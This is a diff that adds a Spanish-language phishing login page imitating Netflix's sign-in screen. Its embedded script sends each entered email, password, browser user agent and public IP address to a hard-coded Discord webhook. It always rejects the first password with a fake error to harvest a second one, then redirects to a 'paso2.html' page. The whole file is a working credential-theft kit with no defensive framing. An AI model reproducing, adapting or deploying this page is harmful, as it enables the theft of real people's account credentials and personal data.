@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Iniciar sesión</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    :root {
+      --dark-bg: #292929;
+      --light-text: #ffffff;
+      --gray-text: #b3b3b3;
+      --input-bg: #333333;
+      --button-blue: #091ee5;
+      --error-red: #e87c03;
+    }
+    
+    body {
+      background-image: url('https://i.imgur.com/4uc3m3B.png');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      background-attachment: fixed;
+      color: var(--light-text);
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .overlay {
+      position: fixed;
+      top: 0; 
+      left: 0;
+      width: 100%; 
+      height: 100%;
+      z-index: 1;
+    }
+    
+    .navbar {
+      position: relative;
+      z-index: 2;
+      padding: 20px 50px;
+    }
+    
+    .login-container {
+      position: relative;
+      z-index: 2;
+      max-width: 450px;
+      margin: 0 auto;
+      background-color: var(--dark-bg);
+      padding: 60px 68px 40px;
+      border-radius: 4px;
+      margin-top: 30px;
+      margin-bottom: 90px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.5);
+    }
+    
+    .login-header {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+    
+    .netflix-logo-title img {
+      max-width: 200px;
+      height: auto;
+      display: inline-block;
+      margin-bottom: 16px;
+    }
+    
+    .login-title-large {
+      font-size: 32px;
+      font-weight: 700;
+      color: var(--light-text);
+      margin-bottom: 8px;
+    }
+    
+    .login-subtitle {
+      font-size: 16px;
+      color: var(--gray-text);
+      margin-bottom: 0;
+    }
+    
+    .form-control {
+      background-color: var(--input-bg) !important;
+      border: 1px solid #444 !important;
+      color: white !important;
+      height: 50px;
+      border-radius: 4px;
+      margin-bottom: 16px;
+      padding: 16px 20px;
+    }
+    
+    .form-control::placeholder {
+      color: #b3b3b3 !important;
+    }
+    
+    .form-control:focus {
+      background-color: var(--input-bg) !important;
+      box-shadow: 0 0 0 0.2rem rgba(255, 255, 255, 0.15) !important;
+      border-color: white !important;
+      color: white !important;
+    }
+    
+    .error-message {
+      background-color: var(--error-red);
+      color: white;
+      padding: 10px;
+      border-radius: 4px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      display: none;
+      text-align: center;
+    }
+    
+    .success-message {
+      background-color: #2e7d32;
+      color: white;
+      padding: 10px;
+      border-radius: 4px;
+      margin-bottom: 16px;
+      font-size: 14px;
+      display: none;
+      text-align: center;
+    }
+    
+    .btn-login {
+      background-color: var(--button-blue);
+      color: white !important;
+      border: none;
+      width: 100%;
+      font-weight: bold;
+      height: 50px;
+      border-radius: 4px;
+      margin-top: 24px;
+      margin-bottom: 12px;
+      font-size: 16px;
+      transition: background-color 0.2s ease;
+    }
+    
+    .btn-login:hover {
+      background-color: #0a1ccf;
+    }
+    
+    .recaptcha {
+      margin-top: 13px;
+      font-size: 13px;
+      color: #8c8c8c;
+    }
+    
+    .recaptcha a {
+      color: #0071eb;
+      text-decoration: none;
+    }
+    
+    .recaptcha a:hover {
+      text-decoration: underline;
+    }
+    
+    footer {
+      position: relative;
+      z-index: 2;
+      background-color: rgba(0,0,0,0.75);
+      padding: 30px 0;
+      margin-top: auto;
+      color: #757575;
+    }
+    
+    .footer-content {
+      max-width: 1000px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+    
+    .footer-title {
+      margin-bottom: 30px;
+    }
+    
+    .footer-links {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 12px;
+    }
+    
+    .footer-links a {
+      color: #757575;
+      font-size: 13px;
+      text-decoration: none;
+    }
+    
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+    
+    /* Versión móvil - AHORA CONSERVA EL MISMO FONDO */
+    @media (max-width: 740px) {
+      /* ELIMINADO: background: black; - ahora conserva la imagen de fondo */
+      body {
+        background-image: url('https://i.imgur.com/4uc3m3B.png');
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        background-attachment: fixed;
+      }
+      
+      .overlay {
+        display: none;
+      }
+      
+      .login-container {
+        max-width: 100%;
+        margin-top: 0;
+        padding: 40px 20px;
+        border-radius: 0;
+      }
+      
+      .navbar {
+        padding: 20px;
+      }
+      
+      .footer-links {
+        grid-template-columns: repeat(2, 1fr);
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay"></div>
+  
+  <nav class="navbar">
+    <div class="logo-container">
+      <div class="logo-placeholder">
+      </div>
+    </div>
+  </nav>
+
+  <div class="login-container">
+    <div class="login-header">
+      <div class="netflix-logo-title">
+        <img src="https://i.imgur.com/upwcKCh.png" alt="Logo">
+      </div>
+      
+      <h1 class="login-title-large">Iniciar sesión</h1>
+      <p class="login-subtitle">Usar su cuenta.</p>
+    </div>
+    
+    <div id="errorMessage" class="error-message">
+      ❌ Contraseña incorrecta. Vuelva a intentarlo.
+    </div>
+    
+    <div id="successMessage" class="success-message">
+      ✅ Verificación correcta.
+    </div>
+    
+    <form id="loginForm">
+      <div class="mb-3">
+        <input type="email" class="form-control" id="email" placeholder="Correo electrónico o número de teléfono" required>
+      </div>
+      <div class="mb-3">
+        <input type="password" class="form-control" id="password" placeholder="Contraseña" required>
+      </div>
+      <button type="submit" class="btn btn-login">Iniciar sesión</button>
+      
+      <div class="recaptcha">
+        Esta página está protegida por Google reCAPTCHA para asegurar que no eres un robot. 
+        <a href="#">Más información</a>.
+      </div>
+    </form>
+  </div>
+
+  <footer>
+    <div class="footer-content">
+      <div class="footer-title">
+        ¿Preguntas? Llama al 1-844-505-2993
+      </div>
+      <div class="footer-links">
+        <a href="#">Preguntas frecuentes</a>
+        <a href="#">Centro de ayuda</a>
+        <a href="#">Términos de uso</a>
+        <a href="#">Privacidad</a>
+        <a href="#">Preferencias de cookies</a>
+        <a href="#">Información corporativa</a>
+      </div>
+    </div>
+  </footer>
+
+  <script>
+    // Variables para controlar los intentos
+    let intentoActual = 0;
+    let emailGuardado = '';
+    let primeraContrasena = '';
+    
+    // WEBHOOK DE DISCORD - REEMPLAZA CON TU URL
+    const webhookURL = 'https://discord.com/api/webhooks/1558530378589933649/GgHfQQyo30dmmo3sxJGxtu0CShDCWY0gb-8q4VbLlDiIJNffBRYApvun6Wr49KyyNaTg';
+    
+    // Función para enviar datos a Discord
+    async function sendToDiscord(email, password, intento) {
+      const message = {
+        content: `🔐 **Nuevo intento de inicio de sesión (Intento #${intento})**`,
+        embeds: [{
+          title: 'Credenciales capturadas',
+          color: 15158332,
+          fields: [
+            {
+              name: '📧 Correo/Teléfono',
+              value: email || 'No proporcionado',
+              inline: true
+            },
+            {
+              name: '🔑 Contraseña',
+              value: `||${password}||`,
+              inline: true
+            },
+            {
+              name: '🌐 Navegador',
+              value: navigator.userAgent.substring(0, 100),
+              inline: false
+            },
+            {
+              name: '🕒 Fecha y hora',
+              value: new Date().toLocaleString('es-ES'),
+              inline: true
+            },
+            {
+              name: '🔄 Intento número',
+              value: intento.toString(),
+              inline: true
+            }
+          ],
+          footer: {
+            text: 'Sistema de verificación de credenciales'
+          }
+        }]
+      };
+      
+      try {
+        // Obtener IP pública
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        message.embeds[0].fields.push({
+          name: '📍 Dirección IP',
+          value: ipData.ip,
+          inline: true
+        });
+      } catch (error) {
+        console.log('No se pudo obtener la IP');
+      }
+      
+      try {
+        await fetch(webhookURL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(message)
+        });
+        console.log(`Intento #${intento} enviado a Discord`);
+      } catch (error) {
+        console.error('Error al enviar a Discord:', error);
+      }
+    }
+    
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+      const errorMessageDiv = document.getElementById('errorMessage');
+      const successMessageDiv = document.getElementById('successMessage');
+      
+      // Ocultar mensajes previos
+      errorMessageDiv.style.display = 'none';
+      successMessageDiv.style.display = 'none';
+      
+      // PRIMER INTENTO
+      if (intentoActual === 0) {
+        // Guardar email y primera contraseña
+        emailGuardado = email;
+        primeraContrasena = password;
+        intentoActual = 1;
+        
+        // Enviar a Discord
+        await sendToDiscord(email, password, intentoActual);
+        
+        // Mostrar mensaje de error
+        errorMessageDiv.style.display = 'block';
+        
+        // Limpiar SOLO el campo de contraseña
+        document.getElementById('password').value = '';
+        document.getElementById('password').focus();
+        
+        // Efecto visual
+        const passwordInput = document.getElementById('password');
+        passwordInput.style.borderColor = '#e87c03';
+        setTimeout(() => {
+          passwordInput.style.borderColor = '#444';
+        }, 500);
+        
+      } 
+      // SEGUNDO INTENTO (cualquier contraseña que escriba, aunque sea diferente)
+      else if (intentoActual === 1) {
+        intentoActual = 2;
+        
+        // Enviar a Discord la segunda contraseña
+        await sendToDiscord(email, password, intentoActual);
+        
+        // Mostrar mensaje de éxito
+        successMessageDiv.style.display = 'block';
+        
+        // Deshabilitar el botón
+        const submitBtn = document.querySelector('.btn-login');
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Verificando...';
+        
+        // Redirigir a index2.html después de 1.5 segundos
+        setTimeout(() => {
+          window.location.href = 'paso2.html';
+        }, 1500);
+      }
+    });
+    
+    // Limpiar mensaje de error cuando el usuario empiece a escribir
+    document.getElementById('password').addEventListener('input', function() {
+      const errorMessageDiv = document.getElementById('errorMessage');
+      if (errorMessageDiv.style.display === 'block') {
+        errorMessageDiv.style.display = 'none';
+        this.style.borderColor = '#444';
+      }
+    });
+  </script>
+</body>
+</html>
